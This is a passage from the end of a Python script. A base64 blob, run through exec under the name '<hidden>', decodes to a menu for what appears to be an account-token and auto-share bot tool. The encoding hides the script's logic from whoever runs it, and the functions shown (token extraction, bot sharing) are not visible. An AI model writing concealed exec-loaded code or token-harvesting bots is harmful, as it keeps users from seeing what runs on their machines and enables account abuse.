ZmlsZSwgZnJhcGFnZXNfZmlsZSkKICAgIHRvdGFsX2FjY291bnRfcnB3LCB0b3RhbF9wYWdlc19ycHcgPSBjb3VudF90b2tlbnMocnB3YWNjb3VudHMscnB3cGFnZXMpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiIiIHtibHVlfeKUj+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUk1wwMzNbMG0iIiIpCiAgICBwcmludChmIiIiIHtibHVlfeKUgyAgICAgICAgICAgICAgICAgICAgICAgIHtob3RwaW5rfSBBQ0NPVU5UIFNUT1JBR0UgICAgICAgICAgICAgICB7Ymx1ZX0gICAgICAgICAgICAgICAgICDilIMiIiIpCiAgICBwcmludChmIiIiIHtibHVlfeKUl+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUmyAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAge2dyZWVufSBBQ0NPVU5Ue3llbGxvd30gOiB7Z3JlZW59e3RvdGFsX2FjY291bnRzfSAiIiIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICBwcmludChmIntibHVlfeKUj+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSB7Z3JlZW59QSBDIEMgTyBVIE4gVCBTIFQgTyBSIEV7Ymx1ZX0g4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSTIikKICAgIHByaW50KGYie2JsdWV94pSDICB7Z3JlZW59WzAxXSB7aG90cGlua30gU1RPUkUgQUNDT1VOVCAgICAgICAgICAgICAgICAgICAgICAgIHt5ZWxsb3d9LSB7Z3JlZW59WyDwnZCA8J2QgvCdkILwnZCO8J2QlPCdkI3wnZCTIF0gICB7Ymx1ZX0gICAgICAgICAgICAg4pSDIikKICAgIHByaW50KGYie2JsdWV94pSX4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSbICIpCiAgICBwcmludChmIntibHVlfeKUj+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSB7Z3JlZW59VCBPIE8gTCAgUyBFIFIgViBJIEMgRSBTe2JsdWV9IOKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUkyIpICAKICAgIHByaW50KGYie2JsdWV94pSDICB7Z3JlZW59WzAyXSAge2hvdHBpbmt98J2QlfCdkIDwnZCL8J2QiPCdkIPwnZCA8J2Qk/CdkIQge2dyZWVufUFDQ09VTlQgICAgICAgICAgICAgICAgICAgICB7eWVsbG93fS0ge2dyZWVufVsg8J2Qk/CdkI7wnZCK8J2QhPCdkI0gXSAgICAge2JsdWV9ICAgICAgICAgICAgIOKUgyIpCiAgICBwcmludChmIntibHVlfeKUgyAge2dyZWVufVswM10gIHtob3RwaW5rffCdkIDwnZCU8J2Qk/CdkI4ge2dyZWVuffCdkJLwnZCH8J2QgPCdkJHwnZCEIPCdkJUxICAgICAgICAgICAgICAgICAgICAgICAge3llbGxvd30tIHtncmVlbn1bIEJPVCBTSEFSRSBdIHtibHVlfSAgICAgICAgICAgICDilIMiKSAKICAgIHByaW50KGYie2JsdWV94pSDICB7Z3JlZW59WzA0XSAge2hvdHBpbmt98J2QgPCdkJTwnZCT8J2QjiB7Z3JlZW598J2QkvCdkIfwnZCA8J2QkfCdkIQg8J2QlTIgICAgICAgICAgICAgICAgICAgICAgICB7eWVsbG93fS0ge2dyZWVufVsgV0lUSCBOT1RJRklDQVRJT04gXXtibHVlfSAgICAgIOKUgyIpIAogICAgcHJpbnQoZiJ7Ymx1ZX3ilJfilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilJsiKQogICAgcHJpbnQoZiJ7Ymx1ZX3ilI/ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEge2dyZWVufUEgQyBDIE8gVSBOIFQgIFIgRSBTIEUgVHtibHVlfSDilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilJMiKQogICAgcHJpbnQoZiJ7Ymx1ZX3ilIMgIHtncmVlbn1bMDVde2hvdHBpbmt9ICDwnZCR8J2QhPCdkJLwnZCE8J2QkyDwnZCT8J2QjvCdkI7wnZCL8J2QkiAgICAgICAgICAgICAgICAgICAgICAgICAge3llbGxvd30tIHtncmVlbn1bIPCdkI/wnZCA8J2QhvCdkIQg8J2QjvCdkJEg8J2QgPCdkILwnZCC8J2QjvCdkJTwnZCN8J2QkyBdICAgICAge2JsdWV9ICDilIMiKQogICAgcHJpbnQoZiJ7Ymx1ZX3ilJfilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilJtcMDMzWzBtIikKICAgIGNob2ljZSA9IGlucHV0KGYiICAgICB7Z3JlZW59IENIT0lDRfCfko4gOiAiKS5zdHJpcCgpICAgICAgICAgCiNDOlxVc2Vyc1xEb250IHRvdWNoIG15IHBjXERlc2t0b3BcT1BFTlNPVVJDRVxzeS5weQogICAgaWYgY2hvaWNlID09ICcxJzoKICAgICAgICBleHRyYWN0aW9uKCkKICAgIGlmIGNob2ljZSA9PSAnMic6CiAgICAgICAgY2hlY2soKQogICAgaWYgY2hvaWNlID09ICczJzoKICAgICAgICBtYWluMigpCiAgICBpZiBjaG9pY2UgPT0gJzQnOgogICAgICAgIHB1YigpCiAgICBpZiBjaG9pY2UgPT0gJzUnOgogICAgCWNsZWFyX3RleHRfZmlsZXMoKQogICAgZWxzZToKICAgICAgICBwcmludCgiSW52YWxpZCBjaG9pY2UsIGV4aXRpbmcuIikKCgoKCgoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgICAgIG1haW4oKQogICAKICAgIAogICAgCiAgICAK""")
exec(compile(_, "<hidden>", "exec"))
